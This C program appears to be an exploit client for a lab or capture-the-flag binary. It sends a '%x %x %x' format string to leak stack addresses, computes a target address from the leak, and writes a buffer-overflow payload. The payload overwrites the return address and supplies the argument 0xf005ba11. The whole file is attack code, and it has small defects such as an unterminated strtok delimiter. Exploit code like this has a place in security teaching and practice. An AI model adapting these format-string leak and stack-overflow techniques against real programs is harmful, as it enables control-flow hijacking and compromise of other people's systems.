
#include <unistd.h>
#include <stdio.h>  // for fwrite()
#include <string.h> // for memset()
#include <stdlib.h> // for EXIT_SUCCESS

#include <stdint.h>

#define BUFFER_SIZE 64

int main()
{

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);  // Initialized to all zeroes

    fprintf(stderr, "send debug statements to stderr\n");

    char greeting[128] = "%x %x %x\n";

    write(STDOUT_FILENO, greeting, sizeof(greeting)-1);

    char response[512];
    fgets(response, sizeof(response), stdin);

    fprintf(stderr, "%s", response);
    char s[1] = " ";
    char* tok;
    int addr = 0, arg = 0xf005ba11;
    tok = strtok(response, s);
    while (tok != NULL)
    {
      addr = strtol(tok, NULL, 16);
      tok = strtok(NULL, s);
    }
    addr = addr - 138;
    fprintf(stderr, "%x %x\n", addr, arg);
    
    strcpy(buffer, "1234567890123456789012345678");
    memcpy(buffer + 28, &addr, 4);
    strcpy(buffer + 32, "1234");
    memcpy(buffer + 36, &arg, 4);
    fprintf(stderr, "%s", buffer);
    write(STDOUT_FILENO, buffer, BUFFER_SIZE);
    
    return EXIT_SUCCESS;
}
